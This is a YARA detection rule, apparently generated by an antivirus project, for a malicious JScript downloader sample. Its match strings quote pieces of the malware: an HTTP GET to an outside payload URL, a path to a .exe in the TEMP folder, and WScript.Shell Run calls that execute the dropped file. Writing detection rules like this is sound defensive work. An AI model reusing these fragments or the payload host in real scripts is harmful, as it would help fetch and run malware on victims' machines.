rule sig_20160328_a025596e82d83b1236794fa3dc646512 {
  meta:
    description = "datamaliciousorder - file 20160328_a025596e82d83b1236794fa3dc646512.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d12b9a449bff4dd1557069756b46ca216398714adf805d920be20cc26dc60217"

  strings:
    $s1  = "function Szkhdt() {return Vwwtx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9k0UgZ6JTsjd7.exe\";};" fullword ascii
    $s2  = "do {WScript[Ymqcpp](Pldoul() * 11)} while (Kqviixqmml[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Xgkymcfz(Rshal, Eojcgu){return Rshal - Eojcgu;};" fullword ascii
    $s4  = "Kqviixqmml[Hjqvxgfcss](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "var Vwwtx = function Mudhfqor() {return WScript[Wxqtya](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dczkcjjky() {return ((Nvjuvk == true) && (Nvjuvk == Hgqesqa)) ? 1 : Uwkru;};" fullword ascii
    $s7  = "function Evvnyfmun(Iqbcsdsq){Vwwtx[\"Run\"](Iqbcsdsq, Uwkru, Uwkru);};" fullword ascii
    $s8  = "var Huftv = new this[\"Date\"]();" fullword ascii
    $s9  = "var Nvjuvk = false;" fullword ascii
    $s10 = "function Pldoul(){return 22;};" fullword ascii
    $s11 = "function Gdigviqgni(Ysfcfjbr) {var Pezhaymh = (1, 2, 3, 4, 5, Ysfcfjbr); return Pezhaymh;};" fullword ascii
    $s12 = "return Xgkymcfz(Ngzikk, Uclptqczba);" fullword ascii
    $s13 = "Nvjuvk = true; " fullword ascii
    $s14 = "function Jvdidegd(){return Zdqpzm;};" fullword ascii
    $s15 = "Hgqesqa = true; " fullword ascii
    $s16 = " while (Mhxifm){" fullword ascii
    $s17 = "var Hupdnbpm = false;" fullword ascii
    $s18 = "function Dkozkkouy()" fullword ascii
    $s19 = "function Abfyxjmqy(){return Wxqtya;};" fullword ascii
    $s20 = "var Hgqesqa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}